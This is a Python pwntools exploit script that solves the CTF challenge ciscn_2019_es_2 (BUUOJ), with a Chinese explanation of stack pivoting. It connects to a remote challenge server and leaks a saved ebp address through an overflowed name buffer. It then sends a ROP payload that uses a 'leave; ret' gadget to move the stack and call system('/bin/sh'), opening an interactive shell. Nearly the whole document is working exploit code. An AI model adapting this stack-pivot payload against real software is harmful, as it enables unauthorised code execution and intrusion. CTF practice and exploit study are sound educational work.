from pwn import *

'''
栈迁移：
    概念：
        由于rsp、esp总是指向栈顶位置，因此可以通过改写rsp、esp的值实现任意栈顶迁移，指向自己想使用的地方
    方法:
        在C语言编译的汇编代码中，函数开头总是需要保存esp、ebp的值，末尾总是需要恢复esp、ebp的值
        例如：
            # function start
            push ebp
            mov ebp esp
            sub esp 0x10
            ...
            mov esp ebp
            pop ebp
            ret
            # function end
        在此编码中，ebp可以通过栈修改值，而且存在mov esp ebp，因此可以通过借ebp将目标值赋给esp，实现栈迁移
    前提：
        使用栈迁移，需要掌握栈地址情况，可以通过printf等泄露任意栈地址的值，泄露地址优先找到原ebp位置，获取ebp记录的地址，再通过相对地址访问任意栈帧
'''


def ciscn_2019_es_2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_es_2'):
    print('ciscn_2019_es_2 start')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 29837)
    target_elf = ELF(file_name)

    payload = b'a' * 40
    # gdb.attach(target)
    target.sendafter('Welcome, my friend. What\'s your name?', payload)

    print(target.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'))
    ebp_addr = u32(target.recv(4))
    #  - 60
    system_plt = p32(target_elf.plt['system'])
    pop_ret_gadget = p32(0x080483bd)  # pop ebx ; ret
    bin_sh_addr = p32(ebp_addr - 60 + 30 + 4)
    leave_addr = p32(0x080485fd)

    # system("/bin/sh")
    payload = system_plt + pop_ret_gadget + bin_sh_addr

    payload += b'a' * (30 - len(payload)) + b'/bin/sh' + p8(0)
    payload += b'a' * (40 - len(payload))
    payload += p32(ebp_addr - 60)
    payload += leave_addr
    print(payload)
    target.sendline(payload)
    target.interactive()

    print('ciscn_2019_es_2 end')


if __name__ == '__main__':
    ciscn_2019_es_2()
